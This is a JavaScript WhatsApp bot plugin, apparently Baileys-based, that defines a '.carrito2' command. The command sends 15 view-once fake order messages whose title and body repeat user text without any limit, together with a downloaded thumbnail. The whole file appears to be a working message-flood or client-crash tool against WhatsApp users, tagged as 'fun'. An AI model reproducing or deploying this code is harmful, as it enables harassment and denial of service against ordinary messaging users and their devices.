import fetch from 'node-fetch';

let handler = async (m, { conn, text }) => {
  const IMAGE_URL = 'https://files.catbox.moe/culffa.jpeg';

  if (!text || !text.includes('|')) {
    return m.reply('❗Uso correcto: .carrito2 Título.Numero|Mensaje.Numero');
  }

  let buffer;
  try {
    const res = await fetch(IMAGE_URL);
    if (!res.ok) throw new Error('❌ No se pudo descargar la imagen desde Catbox');
    buffer = await res.buffer();
  } catch (e) {
    console.error(e);
    return conn.reply(m.chat, '⚠️ Error al obtener la imagen.', m);
  }

  try {
    const [tituloRaw, mensajeRaw] = text.split('|');
    const [tituloTexto, tituloVeces] = tituloRaw.split('.');
    const [mensajeTexto, mensajeVeces] = mensajeRaw.split('.');

    // Repetición sin límite
    const orderTitle = (tituloTexto + ' ').repeat(Number(tituloVeces)).trim();
    const message = (mensajeTexto + ' ').repeat(Number(mensajeVeces)).trim();

    for (let i = 15; i > 0; i--) {
      await conn.relayMessage(m.chat, {
        viewOnceMessage: {
          message: {
            orderMessage: {
              orderId: '0',
              itemCount: 69,
              status: 'DECLINED',
              surface: 'CATALOG',
              orderTitle,
              message,
              orderDescription: 'Carrito con imagen de Catbox 💫',
              thumbnail: buffer,
              token: '1234567890',
              messageVersion: 1,
              buttons: [],
            },
          },
        },
      }, {});
    }
  } catch (err) {
    console.error(err);
    return m.reply('⚠️ Ocurrió un error. Asegúrate de usar el formato correcto: .carrito2 Título.Numero|Mensaje.Numero');
  }
};

handler.help = ['carrito2'];
handler.tags = ['fun'];
handler.command = ['carrito2'];
handler.group = false;
handler.premium = false;
handler.owner = false;

export default handler;